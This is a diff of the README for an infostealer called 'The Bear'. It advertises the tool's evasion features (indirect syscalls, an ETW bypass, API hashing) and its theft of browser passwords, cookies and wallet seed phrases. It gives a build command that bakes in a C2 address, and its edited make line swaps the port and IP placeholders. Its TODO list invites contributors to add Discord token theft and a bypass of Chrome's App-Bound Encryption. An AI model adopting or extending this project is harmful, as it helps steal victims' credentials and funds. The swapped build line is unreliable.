@@ -21,7 +21,7 @@ Unlike traditional infostealers, The Bear functions more as a data exfiltration 
 ## Features
 
 ### Evading Detection
-- **Indirect Syscalls:** Utilizes indirect system calls to avoid detection by security software.
+- **Indirect Syscalls:** Utilizes indirect system calls to avoid user-mode hooks.
 - **ETWTI Bypass:** Employs proxy function calls to bypass Event Tracing for Windows (ETW) and Threat Intelligence.
 - **Dynamic API Resolution:** Resolves API functions dynamically at runtime, making static analysis more challenging.
 - **API hashing:** Uses a custom hashing algorithm to hash API function names, making it difficult for static analysis tools to detect and analyze the malware.
@@ -29,19 +29,19 @@ Unlike traditional infostealers, The Bear functions more as a data exfiltration 
 
 ### Malware Capabilities
 - **Password and Cookie Theft:** Extracts passwords and cookies from Chromium-based browsers.
-- **Cryptocurrency Wallet Theft:** Targets and steals data from extension-based cryptocurrency wallets.
+- **Cryptocurrency Wallet Theft:** Targets and steals data (seed-phrase) from extension-based cryptocurrency wallets.
 
 ## Build
 
 Before building The Bear executable, ensure the following prerequisites are installed:
-- **Python:** Ensure you have it installed.
-- **C Compiler:** For Linux, use the cross-compiler `x86_64-w64-mingw32-gcc`.
+- **Python.**
+- **GNU compiler collection.**
 
 ### Linux
 1. Open a terminal in the project directory.
-2. Run the following command, replacing `<port>` and `<ip address>` with the C2 server's IP and port where its accessable:
+2. Run the following command, replacing `<ip>` and `<port>` with the C2 server's IP and port:
     ```bash
-    make port=<port> ip=<ip address>
+    make port=<ip> ip=<port>
     ```
     This will compile the project and create an executable in the "bin" folder.
 
@@ -59,8 +59,10 @@ For the command-and-control (C2) server, you can use the [Hidden Cave](https://g
 
 ## TODO
 
-- **Fix compiling with the `nostdlib` flag in GCC:** The executable currently compiles but exits before reaching the entry point. Investigate and resolve this issue to ensure proper execution.
-- **Create a MakeFile:** Check out the build.bat file to get an idea how it's compiled.
+- **1:** Improve any part of the stealer.
+- **2:** Add the support to bypass App-Bound Encryption to extract cookies [blog](https://thehackernews.com/2024/08/google-chrome-adds-app-bound-encryption.html).
+- **3:** Add the support for stealing discord tokens.
+- **4:** Add the support for stealing Software-based cryptocurrency wallets seed-phrase.
 
 ## Contributing
 Contributions are welcome! If you would like to contribute to this project, please open an issue first to discuss your proposed changes or additions. This helps ensure that your contribution aligns with the project's goals and prevents duplication of effort. Additionally, check the TODO section for current bugs to fix and areas for improvement.
